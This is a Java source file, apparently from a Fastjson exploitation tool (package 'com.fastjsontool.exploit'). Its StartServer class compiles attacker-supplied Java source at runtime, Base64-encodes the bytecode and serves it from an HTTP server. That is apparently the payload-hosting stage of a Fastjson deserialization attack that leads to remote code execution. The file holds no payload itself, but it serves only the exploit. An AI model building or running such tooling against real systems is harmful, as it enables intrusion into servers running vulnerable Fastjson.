package com.fastjsontool.exploit.httpServer;

import com.fastjsontool.exploit.Info;
import com.fastjsontool.exploit.compiler.JavaStringCompiler;

import java.util.Base64;
import java.util.Map;

public class StartServer implements Runnable {
    private static String ClassName= Info.className;
    private String context="";

    public StartServer(String context) {
        this.context = context;
    }

    @Override
    public void run() {
        Map<String, byte[]> map = null;
        try {
            map = new JavaStringCompiler().compile(this.ClassName+".java", this.context);
            //System.out.println(map);
            byte[] bytes = map.get(this.ClassName);
            byte[] encode = Base64.getEncoder().encode(bytes);
            new HTTPServer().start(new String(encode));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
